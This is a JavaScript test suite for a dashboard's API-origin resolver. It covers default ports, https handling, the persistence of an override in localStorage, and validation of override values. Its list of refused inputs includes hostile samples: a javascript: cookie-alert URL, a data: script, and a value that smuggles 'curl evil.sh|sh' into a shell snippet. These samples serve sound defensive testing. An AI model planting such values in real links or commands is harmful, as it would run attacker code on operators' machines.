// Real tests for the API-origin resolver, extracted from app.js in v0.5.4.
//
// THIS FUNCTION DECIDES WHICH SERVER THE WHOLE DASHBOARD TALKS TO, and it had no test of any kind. Every
// request the page makes is built on its return value, and one of its branches WRITES TO PERSISTENT
// STORAGE — a `?apiOrigin=` in a link repoints this browser at that host until something clears the key,
// long after the query string is gone from the address bar. That is a deliberate operator affordance for
// pointing a local dashboard at another machine, but it is durable in a way a query parameter does not
// look, so it is pinned here rather than left as folklore.
//
// SEALING. `location`, `localStorage` and `document` do not exist in Node. Each is installed per test and
// removed afterwards, and the helper ASSERTS the global was absent first — so no assertion here can pass
// because the host handed us a real one, and a leak from an earlier test fails loudly instead of quietly
// deciding the next result.

import assert from "node:assert/strict";
import test from "node:test";

import { resolveApiOrigin } from "./api-origin.mjs";

const KEY = "aify.next.apiOrigin";

// search: the query string. stored: the value already in localStorage, or null. port: the
// data-default-api-port attribute, or undefined for "not set".
function withBrowser({ search = "", stored = null, port, protocol = "http:", hostname = "localhost", origin }, run) {
  for (const name of ["location", "localStorage", "document"]) {
    assert.equal(name in globalThis, false, `${name} leaked into the test environment — the seal is broken`);
  }
  const store = new Map();
  if (stored !== null) store.set(KEY, stored);
  // `origin` is a real property of a real `location`, and the resolver reads it on the https
  // branch. Omitting it is the same narrower-than-real fake this file already warns about
  // below: the code would be correct and the test would see `undefined`.
  globalThis.location = { search, protocol, hostname, origin: origin ?? `${protocol}//${hostname}` };
  globalThis.localStorage = {
    getItem: (k) => (store.has(k) ? store.get(k) : null),
    setItem: (k, v) => store.set(k, v),
    // A fake narrower than the real API is a fake that fails on correct code: the resolver clears a
    // stored value it refuses, and this stub having only two methods turned that into a TypeError.
    removeItem: (k) => store.delete(k),
  };
  globalThis.document = { documentElement: { dataset: port === undefined ? {} : { defaultApiPort: port } } };
  try {
    return run(store);
  } finally {
    delete globalThis.location;
    delete globalThis.localStorage;
    delete globalThis.document;
  }
}

test("with nothing configured it targets the page's own host on the default port", () => {
  const origin = withBrowser({ protocol: "http:", hostname: "localhost" }, resolveApiOrigin);
  assert.equal(origin, "http://localhost:8800");
});

test("the default port comes from the document, and 8800 is only the fallback", () => {
  // The port is served into the page as data-default-api-port. A deployment on another port sets it, and
  // hardcoding 8800 here would silently ignore that.
  assert.equal(withBrowser({ port: "9100" }, resolveApiOrigin), "http://localhost:9100");
  assert.equal(withBrowser({ port: "" }, resolveApiOrigin), "http://localhost:8800",
    "an empty attribute must fall back, not produce 'localhost:'");
});

test("the fallback keeps the page's own protocol and hostname", () => {
  // A dashboard opened on a LAN address must not be sent to localhost.
  const origin = withBrowser({ hostname: "10.0.0.11", port: "8800" }, resolveApiOrigin);
  assert.equal(origin, "http://10.0.0.11:8800");
});

test("AN HTTPS PAGE USES ITS OWN ORIGIN, not the port attribute", () => {
  // The only https deployment is the Caddy proxy, which serves the page, `/api/*` and `/ws` from ONE
  // origin. Honouring the port attribute here sends an https page to `https://host:8800`, where
  // nothing speaks TLS -- and a page cannot reach a second origin's http API anyway, because the
  // browser blocks it as mixed content. Measured 2026-09-02: the proxied page answered `curl`
  // correctly while telling the BROWSER to call 8800, so the dashboard loaded and stayed empty.
  const origin = withBrowser(
    { protocol: "https:", hostname: "10.0.0.11", origin: "https://10.0.0.11:8443", port: "8800" },
    resolveApiOrigin,
  );
  assert.equal(origin, "https://10.0.0.11:8443",
    "an https page was sent to the port attribute instead of its own origin");
});

test("an explicit ?apiOrigin= still overrides, even on https", () => {
  // The escape hatch survives: pointing the dashboard at another machine is what that parameter is
  // for, and the https rule must not quietly take it away.
  const origin = withBrowser(
    { protocol: "https:", hostname: "10.0.0.11", origin: "https://10.0.0.11:8443",
      search: "?apiOrigin=https://other:9443" },
    resolveApiOrigin,
  );
  assert.equal(origin, "https://other:9443");
});

test("?apiOrigin= wins AND PERSISTS — it outlives the query string that set it", () => {
  // The durable half. After this call the key is set, so the NEXT load with no query string resolves to
  // the same host. This is the behaviour that makes a shared debug link sticky.
  const store = withBrowser({ search: "?apiOrigin=http://other:9000" }, (store) => {
    assert.equal(resolveApiOrigin(), "http://other:9000");
    return store;
  });
  assert.equal(store.get(KEY), "http://other:9000", "the origin must have been written to storage");

  const next = withBrowser({ stored: "http://other:9000" }, resolveApiOrigin);
  assert.equal(next, "http://other:9000", "a later load with no query string keeps the stored origin");
});

test("a stored origin overrides the page's own host, and a query param overrides the stored one", () => {
  assert.equal(withBrowser({ stored: "http://stored:1" }, resolveApiOrigin), "http://stored:1");

  const store = withBrowser({ search: "?apiOrigin=http://fresh:2", stored: "http://stored:1" }, (store) => {
    assert.equal(resolveApiOrigin(), "http://fresh:2");
    return store;
  });
  assert.equal(store.get(KEY), "http://fresh:2", "the new origin must replace the stored one, not sit beside it");
});

test("trailing slashes are stripped, because every caller appends a path", () => {
  // `${apiBase}${path}` with path '/messages/send'. An unstripped origin gives '//api/v1//messages/send'.
  const store = withBrowser({ search: "?apiOrigin=http://other:9000///" }, (store) => {
    assert.equal(resolveApiOrigin(), "http://other:9000", "all trailing slashes, not just one");
    return store;
  });
  assert.equal(store.get(KEY), "http://other:9000", "the STORED copy is stripped too, not just the return value");
});

test("a stored value is re-stripped on read, so a value written by anything else is still safe", () => {
  // Not redundant with the strip above: this path also serves values written by an older build of this
  // function, or by hand in devtools. The guarantee is about what is RETURNED, not about who wrote it.
  assert.equal(withBrowser({ stored: "http://stored:1//" }, resolveApiOrigin), "http://stored:1");
});

test("an EMPTY ?apiOrigin= is ignored rather than stored, and cannot strand the dashboard", () => {
  // `params.get` returns '' for `?apiOrigin=` and null when absent; both are falsy and must fall through.
  // Storing '' would be the bad case — the next load would read a falsy stored value and fall through
  // anyway, but the key would be left holding a value that means nothing.
  const store = withBrowser({ search: "?apiOrigin=" }, (store) => {
    assert.equal(resolveApiOrigin(), "http://localhost:8800");
    return store;
  });
  assert.equal(store.has(KEY), false, "an empty parameter must not be written to storage");
});

test("an empty STORED value falls through to the page's own host", () => {
  assert.equal(withBrowser({ stored: "" }, resolveApiOrigin), "http://localhost:8800");
});

test("importing the module touches no browser global", async () => {
  // THE REASON THIS EXTRACTION IS SHAPED THIS WAY. `apiOrigin` and `apiBase` stay in app.js precisely
  // because they are evaluated at load; if this module ever computed them, importing it here — with no
  // `location` installed — would throw, and every module importing it would become untestable too.
  for (const name of ["location", "localStorage", "document"]) {
    assert.equal(name in globalThis, false, `${name} must not be needed to import this module`);
  }
  const again = await import("./api-origin.mjs");
  assert.equal(again.resolveApiOrigin, resolveApiOrigin, "one module instance, no load-time side effects");
});

// ---- the override is validated, because it is persisted and it reaches sinks ---------------------
//
// `?apiOrigin=` was stored and returned with only trailing slashes stripped. It feeds every fetch,
// the WebSocket URL, `legacy.href` in static-links.mjs, and the Help card's install snippet -- a
// shell command the operator is invited to copy and run. So a `javascript:` value became a
// `javascript:` href, and `http://x;curl evil|sh` rendered as a command that does something other
// than install. Persisted, so removing the parameter from the address bar did not undo either.

//: Values with no legitimate reading. Each one was accepted and stored before this.
const REFUSED = [
  "javascript:alert(document.cookie)",
  "data:text/html,<script>x</script>",
  "http://x;curl evil.sh|sh",
  "//evil.host",
  "not a url",
];

for (const value of REFUSED) {
  test(`a ?apiOrigin= of ${JSON.stringify(value)} is refused and never stored`, () => {
    withBrowser({ search: `?apiOrigin=${encodeURIComponent(value)}` }, (store) => {
      const origin = resolveApiOrigin();
      assert.equal(origin, "http://localhost:8800", "a value with no legitimate reading was adopted");
      assert.equal(store.has(KEY), false, "a refused override was written to persistent storage");
    });
  });

  test(`a STORED ${JSON.stringify(value)} is refused too, not just a fresh one`, () => {
    // Validating only the query parameter would leave an override written before this existed -- or
    // by any other route into localStorage -- in force for as long as the browser keeps it.
    withBrowser({ stored: value }, (store) => {
      assert.equal(resolveApiOrigin(), "http://localhost:8800");
      assert.equal(store.has(KEY), false, "a refused stored value was left in place");
    });
  });
}

//: The control. A resolver that refused everything would pass every case above and break the product.
const ACCEPTED = [
  ["http://192.168.1.11:8800", "http://192.168.1.11:8800"],
  ["https://comms.example:8800", "https://comms.example:8800"],
  ["http://localhost:8800/", "http://localhost:8800"],
  // Pointing at another host is what this parameter is FOR. Restricting it to the page's own host
  // would be a policy decision about how the operator may use their own tool; this is not that.
  ["http://another-machine:9000", "http://another-machine:9000"],
  // Reduced to an origin: path, query and fragment are dropped rather than concatenated into the
  // fetch base, where `/../..` would have travelled into every request URL.
  ["http://good:8800/../../etc?x=1#y", "http://good:8800"],
];

for (const [value, expected] of ACCEPTED) {
  test(`a legitimate ?apiOrigin= of ${JSON.stringify(value)} still works`, () => {
    withBrowser({ search: `?apiOrigin=${encodeURIComponent(value)}` }, (store) => {
      assert.equal(resolveApiOrigin(), expected);
      assert.equal(store.get(KEY), expected, "the normalised origin must be what gets stored");
    });
  });
}
